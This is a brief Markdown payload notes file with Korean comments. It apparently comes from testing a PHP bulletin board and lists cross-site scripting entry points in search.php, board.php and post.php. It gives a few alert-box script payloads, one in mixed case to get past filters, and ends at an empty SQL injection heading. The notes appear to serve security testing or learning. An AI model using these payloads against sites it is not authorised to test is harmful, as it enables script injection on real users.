# Payloads

## XSS

### Attack surfaces

- 게시글 검색 `search.php`의 `q` 파라미터

- 게시판 선택 시 `board.php`의 `page` 파라미터

- 글 생성 및 댓글 생성 `post.php` | `stored xss` 

### Payloads

<!-- 검색하는 곳; 숫자 및 문자열 삽입-->
`/search.php?q=<script>alert%287%29<%2Fscript>`

`/search.php?q=<script>alert%28%27test%27%29<%2Fscript>`

<!-- 글 생성 및 출력되는 곳-->
<!-- 댓글 생성 및 출력되는 곳-->
`GET /post.php`

`/board.php?page=2<ScRiPt>alert(%27page%27)</sCripT>`


## SQL Injection